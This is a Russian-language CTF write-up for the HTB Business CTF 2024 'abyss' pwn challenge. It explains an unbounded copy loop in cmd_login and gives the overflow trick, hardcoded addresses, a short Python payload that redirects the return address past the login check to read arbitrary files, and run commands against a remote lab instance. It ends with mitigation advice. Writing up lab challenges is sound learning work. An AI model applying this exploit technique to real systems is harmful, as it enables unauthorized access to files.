# Abyss 40799 — HTB Business CTF 2024 / file-transfers

**Категория:** pwn, stack overflow, HTB challenge `pwn_abyss.zip`

## Описание
`abyss` — сервис `file transfers`:
- `main` читает `user:pass` из `.creds` в глобальные `VALID_USER`/`VALID_PASS`
- команды `LOGIN (0)` / `READ (1)` / `EXIT (2)` по 4 байта `int`
- `READ` требует `logged_in==1` и делает `open`/`read`/`write` произвольного файла
- `flag.txt` лежит в `/app/flag.txt` (Docker `WORKDIR /app`)

## Уязвимость — `cmd_login()` (source.c:15-55)

```c
char pass[512], user[512], buf[512]; int i;
memset(buf,0,512); read(0,buf,512);
strncmp(buf,"USER ",5);
i=5; while(buf[i]!=0){ user[i-5]=buf[i]; i++; }  // <- нет проверки границ
// второй раз для PASS -> pass
```

* `read` не гарантирует `\0`, весь `buf` может быть без ноля
* `user` сразу за `buf` (0x610), `pass` дальше, `i` по адресу `rbp-4` (12 байт после `pass`), `RBP`/`RET` ещё дальше
* первый `while` копирует пока не встретит `0`, но следующий байт после `buf` — уже `user[0]` (только что скопированный `'a'`), поэтому копирование уходит далеко за `buf`/`user`/`pass` и переписывает `i`/`RBP`/`RET`.

Трюк (ukatemi): перезаписать младший байт `i` на `0x1c`, чтобы следующий `i++` прыгнул через `RBP` прямо на `RET`.

## Эксплойт (без флага)

* Адреса (No PIE): `cmd_login 0x401296`, `cmd_read 0x4014a9`, `logged_in 0x4040c0`
* `0x4014eb` — `test eax,eax` после `mov eax,[logged_in]` в `cmd_read`; `jne 0x401500` — вход в чтение файла. Прыжок на `0x4014eb` не проходит проверку, но `0x401500` требует `00` в адресе. Вместо этого прыгаем на `0x4014eb` и используем `i`-трюк чтобы `RET` стал `0x4014eb` (байты `eb 14 40` без `00`).
* После `ret` в `0x4014eb` мы уже внутри `cmd_read` после проверки — следующий `read(0,buf,512)` ждёт имя файла.

**PAYLOAD:**

```python
RET = b'\xeb\x14\x40' # 0x4014eb
payload = b'a'*(0x5+0xc) + b'\x1c' + b'k'*(0xb) + RET
# USER = "USER " + payload  (37 байт)
# PASS = "PASS " + b'b'*507 (512 байт, без \0)
```

Стек до/после — см. `xxd` в оригинальном райтапе: https://blog.ukatemi.com/blog/2024-05-17-hackthebox-business-pwn-abyss/

1. `LOGIN` (`p32(0)`)
2. `USER` payload выше
3. `PASS` 512 `b`
4. `flag.txt` (или любой путь) — `cmd_read` откроет и `write(1,buf,ret)` вернёт содержимое.

Локально работает против `./abyss` с `.creds` `testuser:testpass` и `flag.txt=HTB{f4k3...}`.

## Запуск

```bash
python3 exploit.py 154.57.164.82 30618
# или
python3 exploit.py --local ./abyss
```

Флаг не хранится в репозитории. Удалённый инстанс — `SPAWNED_TARGET` (`lab-coach` профиль `ctf`), `lab-coach` не логинит и не эксплойтит прод.

## Ссылки

* Оригинальный райтап: https://blog.ukatemi.com/blog/2024-05-17-hackthebox-business-pwn-abyss/
* `pwn_abyss.zip` — `challenge/abyss`, `source.c`, `Dockerfile`

## Защита

* `strncpy`/`memcpy` с лимитом, `buf` всегда `\0`-терминировать (`buf[511]=0`), проверять `i < MAX_ARG_SIZE`
* Stack canary, PIE, `FORTIFY`
